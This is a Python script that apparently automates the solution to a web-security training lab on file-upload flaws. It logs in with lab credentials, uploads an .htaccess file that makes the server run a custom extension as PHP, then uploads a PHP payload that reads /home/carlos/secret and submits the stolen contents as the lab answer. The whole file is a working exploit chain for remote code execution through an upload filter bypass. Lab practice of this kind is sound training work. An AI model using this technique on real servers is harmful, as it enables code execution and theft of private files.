import sys
import requests
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
upload_url = burp_url + '/my-account/avatar'
my_acc = burp_url + '/my-account'
read_flag = burp_url + '/files/avatars/x.xxxx'

session = requests.Session()
response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)

#file 1
response = session.get(my_acc)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_headers = {"Content-Type": "multipart/form-data; boundary=---------------------------149997021411487553681583537615"}
burp_data = f"-----------------------------149997021411487553681583537615\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\".htaccess\"\r\nContent-Type: text/plain\r\n\r\nAddType application/x-httpd-php .xxxx\r\n-----------------------------149997021411487553681583537615\r\nContent-Disposition: form-data; name=\"user\"\r\n\r\nwiener\r\n-----------------------------149997021411487553681583537615\r\nContent-Disposition: form-data; name=\"csrf\"\r\n\r\n{csrf}\r\n-----------------------------149997021411487553681583537615--\r\n"
session.post(upload_url, headers=burp_headers, data=burp_data)

#file 2
response = session.get(my_acc)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_headers = {"Content-Type": "multipart/form-data; boundary=---------------------------149997021411487553681583537655"}
burp_data = f"-----------------------------149997021411487553681583537655\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"x.xxxx\"\r\nContent-Type: application/x-httpd-php\r\n\r\n<?php echo file_get_contents('/home/carlos/secret'); ?>\r\n-----------------------------149997021411487553681583537655\r\nContent-Disposition: form-data; name=\"user\"\r\n\r\nwiener\r\n-----------------------------149997021411487553681583537655\r\nContent-Disposition: form-data; name=\"csrf\"\r\n\r\n{csrf}\r\n-----------------------------149997021411487553681583537655--\r\n"
session.post(upload_url, headers=burp_headers, data=burp_data)

response = session.get(read_flag)
flag = response.text
print(flag)

burp_data = {"answer": flag}
session.post(burp_url+'/submitSolution', data=burp_data)
